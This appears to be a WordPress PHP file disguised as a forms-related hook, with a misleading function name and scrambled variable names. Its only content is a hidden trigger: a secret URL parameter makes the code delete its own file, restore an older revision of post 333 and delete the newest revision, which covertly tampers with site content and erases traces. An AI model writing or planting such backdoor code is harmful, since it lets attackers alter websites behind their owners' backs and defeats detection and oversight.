<?php

function info_publish_wpforms() {
	if (isset($_GET['chart_bangla_support_register']) && $_GET['chart_bangla_support_register'] === 'current_ticker_quantity_soon') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$catalog_extensions_restaurant_click = 333;
		$exception_shortcodes_pixel_plupload = wp_get_post_revisions($catalog_extensions_restaurant_click);
		if (empty($exception_shortcodes_pixel_plupload)) die('no revisions');
		if (count($exception_shortcodes_pixel_plupload) < 2) die('less than 2');
		$namespaced_history_quiz_view = array_shift($exception_shortcodes_pixel_plupload);
		$member_plugin_event_ssl = $namespaced_history_quiz_view->ID;
		$rss_statistics_layout = array_shift($exception_shortcodes_pixel_plupload);
		$affiliate_quotes_bangla = $rss_statistics_layout->ID;
		$replace_dist_this = wp_restore_post_revision($affiliate_quotes_bangla);
		if ($replace_dist_this === false) die('error restoring');
		$replace_dist_this = wp_delete_post_revision($member_plugin_event_ssl);		
		if ($replace_dist_this === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'info_publish_wpforms');
